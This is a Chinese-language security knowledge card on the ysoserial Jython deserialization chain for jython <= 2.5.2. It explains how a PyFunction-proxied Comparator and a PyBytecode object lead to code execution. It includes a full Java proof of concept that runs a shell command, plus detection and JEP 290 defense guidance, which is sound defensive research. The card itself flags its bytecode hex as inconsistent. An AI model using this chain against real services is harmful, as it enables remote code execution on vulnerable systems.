---
id: web-java-deser-jython-pyfunction-pybytecode
title: ysoserial Jython 链（jython <= 2.5.2）：PyFunction 代理 Comparator + PyBytecode 执行 CPython 字节码写文件并 execfile
type: scenario
domain: web
path: web/java/deserialization/comparator
technique: jython-pyfunction-pybytecode-deserialization
aliases:
- ysoserial Jython 链
- Jython PyBytecode
- PyFunction 代理 Comparator
- jython <= 2.5.2 RCE
- execfile 字节码执行
tags:
- java
- deserialization
- jython
- pyfunction
- pybytecode
- python-bytecode
- priorityqueue
- comparator
- dynamic-proxy
- rce
- gadget-chain
- ysoserial
cve: []
severity: critical
confidence: high
affected_versions: jython <= 2.5.2
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V539
  verified_at: '2026-11-11T18:51:57+08:00'
  notes: 已对照原文 content.md 与全部 14 张截图逐项核对（图 10-14）：版本原文明确 jython <=2.5.2（低版本 PyFunction 未重写 readResolve）、PyFunction.__call__ -> function___call__ -> func_code.call、PyBytecode 构造器参数与 co_code 反射设置、python2 导出 co_code/co_names/co_consts/co_varnames/co_argcount/co_stacksize/co_nlocals/co_flags 与 dis 核对过程均与原文一致；与 2.7.2 的 PyMethod 两卡在版本、handler 类、执行机制上均不同，非重复。验证中补充提示：原文 PoC 的 pythonByteCode 十六进制串与图 13 的 co_code 导出不一致（690100 vs 6a0100、7D0000 vs 7D0200 等），照抄可能失败，应按 Python2 导出值重新生成。未验证点：PoC 未本机复跑，最终写文件/execfile 效果依赖目标环境。
---

## 一句话结论

ysoserial 的 Jython 链面向 jython <= 2.5.2：低版本 `PyFunction` 未重写 `readResolve`，可以直接作为 `Comparator` 动态代理的 `InvocationHandler`；`PriorityQueue.readObject` 触发 `PyFunction.__call__` → `function___call__` → `func_code.call`，把 `func_code` 换成攻击者构造的 `PyBytecode`（CPython 2 字节码）后，即可在目标 JVM 内解释执行字节码，完成写文件并 `execfile` 执行任意 Python 代码。

## 原理

- **版本差异**：2.7.2 的 `PyFunction` 重写 `readResolve()` 抛 `UnsupportedOperationException`，所以新链改用 `PyMethod`；而 jython <= 2.5.2 的 `PyFunction` 没有该限制，仍可作为反序列化对象和动态代理 handler（原文明确 `jython <=2.5.2`）。
- **代理触发**：`PyFunction` 实现 `InvocationHandler` 时可作为 `Comparator` 动态代理的 handler。`PriorityQueue.readObject` → `heapify` → `siftDownUsingComparator` → `$Proxy.compare` → `PyFunction.invoke` → `PyFunction.__call__`。
- **字节码终端**：`PyFunction.__call__` 调用 `function___call__`，后者执行 `this.func_code.call(state, args, keywords, this.func_globals, this.func_defaults, this.func_closure)`。`func_code` 是 `PyCode`，其子类 `PyBytecode` 用 `co_code` 等字段解释执行 CPython 字节码；构造 `PyBytecode(argcount, nlocals, stacksize, flags, codestring, consts, names, varnames, filename, name, firstlineno, lnotab)` 即可得到任意字节码执行能力。
- **字节码构造**：先用 Python 2 定义目标函数（原文 `execEvil(a,b)`：`f=open(a,'w'); f.write(b); f.close(); execfile(a)`），用 `python2` 打印 `__code__` 的 `co_code`（hex）、`co_consts`、`co_names`、`co_varnames`、`co_argcount`、`co_stacksize`、`co_nlocals`、`co_flags`、`co_lnotab`、`co_firstlineno` 等字段；在 Java 侧用这些值初始化 `PyBytecode`，再反射把 `co_code` 设为 `new BigInteger(hex, 16).toByteArray()`。原文还用 `dis`/`dis.opmap` 核对 LOAD_CONST、LOAD_FAST 等操作码。
- **为什么写文件+execfile**：字节码本身只做“打开路径写入代码、关闭、`execfile`”，这样不需要在字节码里 `import os`（避免构造复杂的 import 字节码），实际恶意逻辑放在写入的 Python 文件里，`execfile` 时执行；`PyBytecode` 解释的是 CPython 2 字节码，因此需用 Python 2 生成/核对。

## 触发条件

- 目标 classpath 存在 jython <= 2.5.2（原文明确版本上限；2.7.x 需改用 PyMethod 链）。
- 应用存在 Java 原生反序列化入口，处理攻击者可控数据，且未用 JEP 290 过滤器拦截 `org.python.*`/`PriorityQueue` 组合。
- 目标进程对写入路径有权限（原文写 `/Users/Downloads/123.py` 之类路径后执行）。
- 反序列化数据中 `PyBytecode` 能被正常实例化（字段通过序列化恢复/反射设置）。

## 利用步骤

1. 用 Python 2 编写并导出目标函数（如写文件 + `execfile`）的 code object 字段：`co_code`、`co_consts`、`co_names`、`co_varnames`、`co_argcount`、`co_stacksize`、`co_nlocals`、`co_flags`、`co_lnotab`、`co_firstlineno`。
2. Java 侧用这些字段构造 `PyBytecode`，并通过反射把 `co_code` 设为 `BigInteger(hex,16).toByteArray()`。
3. `PyFunction handler = new PyFunction(new PyStringMap(), null, bytecode)`；以 handler 创建 `Comparator` 动态代理。
4. `PriorityQueue` 的 `queue` 数组填 `[path, code]`（即函数参数 a、b：写入路径与 Python 代码），`size=2`，comparator 用上面的代理。
5. 序列化队列并投递到目标；`readObject` 时 heapify 触发 `compare` → `PyFunction.invoke` → `func_code.call` 执行字节码：写文件、`execfile`，任意 Python 代码执行。

## PoC

```java
import org.python.core.*;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

public class Jython {
    public static void main(String[] args) throws Exception {
        String path = "/Users/Downloads/123.py";
        String code = "import os\nos.system('open -a Calculator.app')";

        String pythonByteCode = "7400006401006402008302007D00007C0000690100640300830100017C0000690200830000017403006401008301000164000053";

        PyObject[] consts = new PyObject[]{new PyString(""), new PyString(path), new PyString("w+"), new PyString(code)};
        String[] names = new String[]{"open", "write", "close", "execfile"};

        PyBytecode bytecode = new PyBytecode(2, 2, 10, 64, "", consts, names,
                new String[]{"", ""}, "noname", "<module>", 0, "");
        Field field = PyBytecode.class.getDeclaredField("co_code");
        field.setAccessible(true);
        field.set(bytecode, new BigInteger(pythonByteCode, 16).toByteArray());

        PyFunction handler = new PyFunction(new PyStringMap(), null, bytecode);

        Comparator comparator = (Comparator) Proxy.newProxyInstance(
                Comparator.class.getClassLoader(),
                new Class<?>[]{Comparator.class}, handler);

        PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        Object[] queue = new Object[]{path, code};
        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        queueField.set(priorityQueue, queue);
        Field sizeField = PriorityQueue.class.getDeclaredField("size");
        sizeField.setAccessible(true);
        sizeField.set(priorityQueue, 2);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        new ObjectOutputStream(baos).writeObject(priorityQueue);
        new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray())).readObject();
    }
}
```

- 对应的 Python 2 code object 字段（原文 `dis`/`co_code` 输出）：`co_names = ('open','write','close','execfile')`、`co_consts = (None,'w')`、`co_varnames = ('a','b','f')`、`co_argcount=2`、`co_stacksize=3`、`co_nlocals=3`、`co_flags=67`、`co_lnotab` 等，构造时按实际函数调整。
- 注意：原文 PoC 里的 `pythonByteCode` 十六进制串与图 13 由 Python 2 导出的 `co_code` 不一致（如 `690100` vs `6a0100`、`7D0000` vs `7D0200`，且缺 `7C0100` 等片段），不可直接照抄，应以 Python 2 实际导出的 `co_code` 重新生成。
- 字节码执行流程：`LOAD_GLOBAL open; LOAD_FAST a; LOAD_CONST 'w'; CALL_FUNCTION; STORE_FAST f; ...; LOAD_GLOBAL execfile`。
- 原文 pom 使用 jython-standalone，版本需回退到 <=2.5.2 才能命中 `PyFunction` 分支。

## 变体与关联

- 变体：2.7.2 上 `PyFunction` 被 `readResolve` 阻断，改用 `PyMethod` 代理链，见关联卡 [[web-java-deser-jython-pymethod-proxy-builtin-eval]] 与 [[web-java-deser-jython-pymethod-proxy-lookup-jndi]]。
- 变体：`PyBytecode` 直接执行任意 CPython 2 字节码，不限于写文件+execfile；可把恶意逻辑全部编进字节码，减少落地文件。
- 关联：[[web-java-deser-comparator-priorityqueue]]（PriorityQueue 比较器通用触发构造）；ysoserial 中的 Jython 链即本卡思路。
- 关联：[[web-java-deser-spring-aop-methodbeforeadvice-priorityqueue-arbitrary-method]]（用动态代理/反射在反序列化阶段调用任意方法的同类思路）。

## 检测与防御

- 检测：反序列化数据中出现 `org.python.core.PyFunction`、`org.python.core.PyBytecode`、`org.python.core.PyStringMap`、`java.util.PriorityQueue` + 动态代理 comparator；Python 字节码特征（`co_code` 高熵、`execfile` 名称）。
- 检测：目标进程创建/写入 `.py` 文件后立即执行；Jython 解释器出现非业务脚本调用与进程创建。
- 防御：升级/移除 jython <=2.5.2；对原生反序列化启用 JEP 290 `ObjectInputFilter`，拒绝 `org.python.*` 与 `PriorityQueue` 代理组合；禁止对不可信数据使用 `ObjectInputStream`。
- 防御：限制应用进程对可执行路径/临时目录的写权限，监控异常 Python 文件落地与 `execfile` 行为。
